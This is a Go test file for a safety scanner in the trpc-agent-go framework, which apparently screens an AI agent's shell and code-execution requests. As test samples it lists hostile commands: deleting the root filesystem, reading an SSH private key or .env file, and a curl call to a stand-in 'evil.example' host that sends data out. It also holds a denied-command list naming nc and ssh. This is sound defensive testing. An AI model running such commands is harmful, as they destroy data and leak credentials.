//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestScannerAcceptanceSamples(t *testing.T) {
	p := DefaultPolicy()
	p.DeniedCommands = []string{
		"rm", "nc", "ssh", "sudo",
		"apt", "apt-get", "npm", "pip", "pip3",
	}
	s := NewScanner(p)

	tests := []struct {
		name     string
		req      Request
		decision Decision
		rule     string
	}{
		{
			name: "safe go test",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "go test ./tool/safety",
			},
			decision: DecisionAllow,
		},
		{
			name: "dangerous delete",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "rm -rf /",
			},
			decision: DecisionDeny, rule: ruleDangerousDelete,
		},
		{
			name: "read secret",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny, rule: ruleSensitivePath,
		},
		{
			name: "network denied",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "curl https://evil.example/steal",
			},
			decision: DecisionDeny, rule: ruleNetworkEgress,
		},
		{
			name: "network allowed",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "curl https://github.com/trpc-group/trpc-agent-go",
			},
			decision: DecisionAllow,
		},
		{
			name: "shell wrapper",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: `sh -c "echo hi"`,
			},
			decision: DecisionAsk, rule: ruleShellWrapper,
		},
		{
			name: "pipeline",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "cat go.mod | wc -l",
			},
			decision: DecisionAsk, rule: rulePipeline,
		},
		{
			name: "dependency install",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "go install example.com/tool@latest",
			},
			decision: DecisionAsk, rule: ruleDependencyInstall,
		},
		{
			name: "long running",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "sleep 120",
			},
			decision: DecisionAsk, rule: ruleResourceRuntime,
		},
		{
			name: "huge output",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "yes",
			},
			decision: DecisionAsk, rule: ruleResourceOutput,
		},
		{
			name: "hostexec long session",
			req: Request{
				ToolName: "hostexec_exec_command", Backend: BackendHostExec,
				Command: "go test ./...", TTY: true, Background: true,
			},
			decision: DecisionAsk, rule: ruleHostSession,
		},
		{
			name: "ask review parse error",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "echo $(whoami)",
			},
			decision: DecisionAsk, rule: ruleParseError,
		},
		{
			name: "sensitive output",
			req: Request{
				ToolName: "execute_code", Backend: BackendCodeExec,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     `print("token=sk-secret")`,
				}},
			},
			decision: DecisionDeny, rule: ruleSecretLeakage,
		},
		{
			name: "large concurrency",
			req: Request{
				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: "go test -parallel 256 ./...",
			},
			decision: DecisionAsk, rule: ruleResourceConcurrent,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := s.Scan(context.Background(), tt.req)
			require.Equal(t, tt.decision, report.Decision)
			require.NotEmpty(t, report.RiskLevel)
			require.NotZero(t, report.ScannedAt)
			if tt.rule != "" {
				require.NotEmpty(t, report.Findings)
				require.Equal(t, tt.rule, report.Findings[0].RuleID)
				require.NotEmpty(t, report.Findings[0].Evidence)
				require.NotEmpty(t, report.Findings[0].Recommendation)
			}
		})
	}
}

func TestScannerAcceptanceRates(t *testing.T) {
	s := NewScanner(DefaultPolicy())
	safe := []Request{
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "go test ./tool/safety"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "curl https://github.com/trpc-group/trpc-agent-go"},
	}
	unsafe := []Request{
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "rm -rf /"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "cat ~/.ssh/id_rsa"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "cat .env"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "curl https://evil.example/steal"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: `sh -c "echo hi"`},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "go install example.com/tool@latest"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "sleep 120"},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "yes"},
		{ToolName: "hostexec_exec_command", Backend: BackendHostExec, Command: "go test ./...", TTY: true},
		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "echo token=sk-secret"},
	}

	falsePositives := 0
	for _, req := range safe {
		if s.Scan(context.Background(), req).Decision != DecisionAllow {
			falsePositives++
		}
	}
	detected := 0
	for _, req := range unsafe {
		if s.Scan(context.Background(), req).Decision != DecisionAllow {
			detected++
		}
	}
	require.GreaterOrEqual(t, float64(detected)/float64(len(unsafe)), 0.90)
	require.LessOrEqual(t, float64(falsePositives)/float64(len(safe)), 0.10)
}
